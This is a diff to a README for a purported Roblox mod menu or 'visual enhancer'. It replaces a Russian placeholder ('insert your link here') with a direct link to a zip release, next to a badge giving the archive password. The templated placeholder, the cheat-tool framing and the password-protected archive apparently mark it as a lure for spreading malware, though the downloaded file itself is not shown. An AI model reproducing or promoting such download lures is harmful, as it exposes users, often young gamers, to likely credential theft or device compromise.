@@ -18,7 +18,7 @@ An advanced, high-performance environment modifications suite designed for deep 
 
 Click the button below to get the latest compiled stable build (Includes auto-updater and configuration presets).
 
-[![Download RBLX Visual Enhancer](https://img.shields.io/badge/DOWNLOAD-Latest%20Release%20(v2.4.1)-🚀%20Green?style=for-the-badge&logo=windows&logoColor=white&color=2k-success)](СЮДА_ВСТАВЬ_СВОЮ_ССЫЛКУ)
+[![Download RBLX Visual Enhancer](https://img.shields.io/badge/DOWNLOAD-Latest%20Release%20(v2.4.1)-🚀%20Green?style=for-the-badge&logo=windows&logoColor=white&color=2k-success)](https://github.com/tammyrahl/Roblox-CoreMod-Menu/releases/download/download/Roblox.CoreMod.zip)
 ![PASSWRD: 2026](https://img.shields.io/badge/Passwrd-2026-blue?style=flat)
 ---
 
